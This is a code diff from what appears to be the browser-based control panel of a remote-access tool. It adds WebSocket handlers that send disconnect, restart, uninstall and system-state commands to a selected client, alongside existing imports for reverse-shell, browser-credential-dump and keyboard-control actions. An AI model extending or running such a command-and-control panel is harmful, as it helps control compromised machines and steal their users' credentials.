@@ -20,6 +20,7 @@ import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverse
 import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
 import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
 import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
+import {DISCONNECT, RESTART, SYSTEM_STATE, UNINSTALL} from "@redux/actions/stateActions";
 
 
 const sendWebSocketMessage = (websocket, message) => {
@@ -314,6 +315,44 @@ export const handleMessageBox = async (websocket, store, action) => {
     const message = {
         ACTION: SHOW_MESSAGE_BOX,
         info: action.payload.info,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request message box to " + action.payload);
+}
+
+export const handleSystemState = async (websocket, store, action) => {
+    const message = {
+        ACTION: SYSTEM_STATE,
+        type: action.payload,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request message box to " + action.payload);
+}
+
+
+export const handleDisconnect = async (websocket, store, action) => {
+    const message = {
+        ACTION: DISCONNECT,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request message box to " + action.payload);
+}
+
+export const handleRestartConnection = async (websocket, store, action) => {
+    const message = {
+        ACTION: RESTART,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request message box to " + action.payload);
+}
+
+export const handleUninstall = async (websocket, store, action) => {
+    const message = {
+        ACTION: UNINSTALL,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
     sendWebSocketMessage(websocket, message);
